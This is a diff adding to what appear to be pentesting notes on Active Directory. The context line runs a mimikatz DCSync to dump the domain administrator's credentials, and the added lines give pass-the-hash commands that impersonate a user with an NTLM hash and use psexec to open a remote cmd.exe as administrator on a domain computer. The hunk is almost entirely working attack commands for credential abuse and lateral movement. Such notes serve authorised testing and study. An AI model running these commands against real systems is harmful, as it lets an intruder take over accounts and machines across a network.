@@ -1180,6 +1180,18 @@ PS C:\zeropio> .\mimikatz.exe
 mimikatz # lsadump::dcsync /domain:<DOMAIN>.LOCAL /user:<DOMAIN>\administrator
 ```
 
+If we want to impersonate before doing it:
+```console
+mimikatz # sekurlsa::pth /user:<USER> /ntlm:<NTLM HASH> /domain:<DOMAIN>.local /impersonate
+```
+
+We can also execute commands through mimikatz to spawn a cmd (we need to be connect to RDP) with the Psexec.exe util in the same folder:
+```console
+mimikatz # sekurlsa::pth /user:administrator /ntlm:<NTLM HASH> /domain:<DOMAIN>.local /run:".\psexec.exe /accepteula \\<COMPUTER NAME>.<DOMAIN>.local -h cmd.exe" 
+```
+
+
+
 ---
 
 # Lateral And Vertical Movement
